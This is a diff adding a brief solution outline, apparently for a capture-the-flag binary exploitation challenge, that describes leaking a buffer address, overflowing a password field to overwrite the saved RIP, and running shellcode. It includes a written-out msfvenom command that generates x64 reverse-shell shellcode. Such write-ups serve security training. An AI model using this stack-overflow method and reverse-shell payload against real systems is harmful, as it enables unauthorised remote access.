@@ -1,0 +1,15 @@
+How to solve:
+
+1. Connect to the program
+2. Identify the memory leak
+3. Identify the overflow in the password field
+4. Identify that exiting the program causes seg-fault, due to overwriting the RIP.
+
+4. Load up the program in debugger
+5. Identify the offset from start of buffer to overwriting the saved RIP
+6. Write script that takes the address of buffer (the leak), and uses it as the value to overwrite RIP.
+7. Write shellcode that either retrieves the file, or runs a reverse shell
+
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=8080 --platform linux -a x64 -b "\x00" -f python
+
+Solution could require port forwarding in home router, but doesn't have to.
